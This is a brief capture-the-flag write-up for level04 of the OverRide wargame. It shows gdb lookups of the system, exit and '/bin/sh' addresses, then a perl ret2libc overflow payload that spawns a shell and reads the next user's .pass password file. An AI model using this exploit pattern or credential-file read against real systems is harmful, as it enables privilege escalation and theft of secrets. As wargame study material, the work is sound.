# level04

```
level04@OverRide:~$ gdb -q level04
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x80486cd
(gdb) run
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486cd in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
```

```
level04@OverRide:~$ cat <(perl -e 'print "A"x156 . pack("V", 0xf7e6aed0) . pack("V", 0xf7e5eb70) . pack("V", 0xf7f897ec)') - | ./level04
Give me some shellcode, k

whoami
level05
cat /home/users/$(whoami)/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
